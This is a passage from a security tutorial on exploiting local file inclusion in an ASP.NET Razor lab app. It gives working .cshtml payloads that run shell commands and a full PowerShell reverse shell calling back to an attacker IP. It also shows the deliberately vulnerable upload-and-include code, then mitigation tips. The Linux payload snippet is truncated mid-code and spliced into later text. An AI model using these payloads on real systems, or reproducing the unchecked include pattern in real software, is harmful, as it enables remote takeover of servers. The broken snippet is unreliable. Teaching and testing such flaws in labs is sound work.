<img src="{{ page.image-base | prepend:site.baseurl }}asp_attacker_ip.png" alt="ASP Attacker IP" width="100%">

Open the application in the browser:

<img src="{{ page.image-base | prepend:site.baseurl }}asp_index.png" alt="ASP Index" width="100%">

### LFI

#### Test Parameter

##### Sanity check lfi

Create a file `SimpleEchoPayload.cshtml`:

<pre><code class="bash">echo &#x22;Hi&#x22; &#x3E; SimpleEchoPayload.cshtml
</code></pre>

and upload it. 

In this application there is a param `test` which is vulnerable. You have to give the file the `.cshtml` extension,
otherwise you will get an error like the following:

<img src="{{ page.image-base | prepend:site.baseurl }}asp_error_nocshtml.png" alt="ASP Error No CSHTML" width="100%">

After you have uploaded `SimpleEchoPayload.cshtml` you can verify the Local File Inclusion:

<img src="{{ page.image-base | prepend:site.baseurl }}asp_lfi_sanity_check.png" alt="ASP LFI Sanity Check" width="100%">

##### Getting remote code execution

###### List directory

Now let's go one step further and try to execute shell commands.

For this you can use the following code:

<pre><code class="DOS.bat">type WinLfiPayload.cshtml</code></pre>
<pre><code class="C#">@using System.Diagnostics
@{

    var proc = new Process
    {
        StartInfo = new System.Diagnostics.ProcessStartInfo
        {
            FileName = &#x22;cmd.exe&#x22;,
            Arguments = &#x22;/c dir&#x22;,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true
        }
    };

    proc.Start();
    string line = &#x22;&#x22;;
    while (!proc.StandardOutput.EndOfStream)
    {
        line = line + proc.StandardOutput.ReadLine() + &#x22;&#x3C;br&#x3E;&#x22;;
    }
    ViewData[&#x22;Cmdout&#x22;] = line;
}
</code></pre>

<pre><code class="C#">@Html.Raw(@ViewData[&#x22;Cmdout&#x22;])
</code></pre>

If you look at the lines with

<pre><code class="C#">FileName = &#x22;cmd.exe&#x22;,
Arguments = &#x22;/c dir&#x22;,
</code></pre>

you see that this CSHTML-File will execute a Windows Command: 

<pre><code class="DOS.bat">cmd.exe /c dir
</code></pre>

Result:

<img src="{{ page.image-base | prepend:site.baseurl }}asp_victim_rce_dir.png" alt="ASP Victim RCE dir" width="100%">

If you have a Linux Server running dotnet you can change this code for example to the Linux equivalent:

<pre><code class="bash">ls
</code></pre>

Then the code would look like:

<pre><code class="bash">cat LinuxLfiPayload.cshtml</code></pre>
<pre><code class="C#">@using System.Diagnostics
@{

    var proc = new Process
    {
        StartInfo = new System.Diagnostics.ProcessStartInfo
        {
            FileName = &#x22;ls&#x22;,

@Html.Raw(@ViewData[&#x22;Cmdout&#x22;])

Splendid! This means we can execute powershell commands on the victim server.

###### Remote code execution

Now we use `Arguments` to run a Powershell Command to setup a reverse shell.

First we go into our attacker machine. Therefore we have to get the `docker id` using 

<pre><code class="bash">docker ps -a</code></pre>

Then we use this id to go into our attacker server:

<pre><code class="bash">docker exec -ti &#x3C;containerid_attackerserver&#x3E; powershell</code></pre>

Here we check our ip

<pre><code class="DOS.bat">ipconfig</code></pre>

, set up a netcat listener

<pre><code class="DOS.bat">nc -nlvp 4444</code></pre>

and create a file in which we include our attacker ip in the reverse shell code (this code was used from <a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">Week of PowerShell Shells - Announcement and Day 1</a>)

<pre><code class="DOS.bat">RevShell.cshtml</code></pre>

<pre><code class="C#">@using System.Diagnostics
@{

     var proc = new Process
     {
         StartInfo = new System.Diagnostics.ProcessStartInfo
         {
             FileName = &#x22;cmd.exe&#x22;,
             Arguments = @&#x22;/c powershell.exe -nop &#x22;&#x22;$client = New-Object System.Net.Sockets.TCPClient(&#x27;172.20.232.246&#x27;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream. Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&#x3E;&#x26;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; +       (pwd).Path + &#x27;&#x3E; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#x22;&#x22;&#x22;,
             UseShellExecute = false,
             RedirectStandardOutput = true,
             CreateNoWindow = true
         }
     };

     proc.Start();
     string line = &#x22;&#x22;;
     while (!proc.StandardOutput.EndOfStream)
     {
         line = line + proc.StandardOutput.ReadLine() + &#x22;&#x3C;br&#x3E;&#x22;;
     }
     ViewData[&#x22;Cmdout&#x22;] = line;
 }

@Html.Raw(@ViewData[&#x22;Cmdout&#x22;])
</code></pre>

If we upload this file, and call `http://<ip-docker-container>:8080/?test=RevShell.cshtml` we get a reverse shell:

<img src="{{ page.image-base | prepend:site.baseurl }}asp_reverseshell.png" alt="ASP Powershell reverse shell" width="100%">

### Faulty code

The faulty code in ASP / Razor looks like this:

<pre><code class="DOS.bat">Index.cshtml</code></pre>  

<pre><code class="C#">@page
@model IndexModel

@if (HttpContext.Request.Query[&#x22;test&#x22;] != default(Microsoft.AspNetCore.Http.IQueryCollection))
{
    @Html.Partial(HttpContext.Request.Query[&#x22;test&#x22;])
}


&#x3C;h2&#x3E;ASP.NET LFI Payload Tester&#x3C;/h2&#x3E;

&#x3C;form method=&#x22;post&#x22; enctype=&#x22;multipart/form-data&#x22;&#x3E;
    &#x3C;input type=&#x22;file&#x22; asp-for=&#x22;Upload&#x22; /&#x3E;
    &#x3C;input type=&#x22;submit&#x22; /&#x3E;
&#x3C;/form&#x3E;
</code></pre>

<pre><code class="DOS.bat">Index.cshtml.cs</code></pre>  

<pre><code class="C#">using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;

using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using System.IO;

namespace Test.Pages
{
    public class IndexModel : PageModel
    {
        public void OnGet()
        {

        }

        private IHostingEnvironment _environment;

        public IndexModel(IHostingEnvironment environment)
        {
            _environment = environment;
        }

        [BindProperty]
        public IFormFile Upload { get; set; }

        public async Task OnPostAsync()
        {
            var file = Path.Combine(_environment.ContentRootPath, &#x26;#x22;Pages&#x26;#x22;, Upload.FileName);
            using (var fileStream = new FileStream(file, FileMode.Create))
            {
                await Upload.CopyToAsync(fileStream);
            }
        }
    }
}
</code></pre>

# Mitigation

There are different methods to find LFI/RFI vulnerabilities.

You can use Black- and White-Box-Testing:

## Blackbox-Testing

To find at least the lfi vulnerabilities which allow file path traversal you can use [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)

<img src="{{ page.image-base | prepend:site.baseurl }}owaspzap2.png" alt="OWASP ZAP 2" width="100%">
<img src="{{ page.image-base | prepend:site.baseurl }}owaspzap1.png" alt="OWASP ZAP 1" width="100%">

## Whitebox-Testing

Try to find certain strings in your code that contain
a) code files are included and 
b) the user can determine the names of the files himself at the same time

## For admins

Try to harden the server settings from the beginning and only open them when needed.
Keyword here [Secure by Default] (https://en.wikipedia.org/wiki/Secure_by_default).

In PHP for example let `allow_url_fopen` and `allow_url_include` set to `Off` in `php.ini` configuration file.
 
## For developers

As a developer, you should only allow the client to have the files that are intended for it. 
Never try to soften that. Do not allow client control what files to load.

Furthermore, use metrics to select libraries, frameworks and programming languages. And then keep them up-to-date.

# Summary

Local file inclusion and in particular remote file inclusion are dangerous security vulnerabilities that may allow an attacker direct access to the system.

In this article I described what LFI/RFI is and how to use it.

Finally, I showed you how to find these gaps in your own projects.

# Further Information

A description how to test can be found at OWASP:

- [https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)

A good introduction in the realm of PHP:
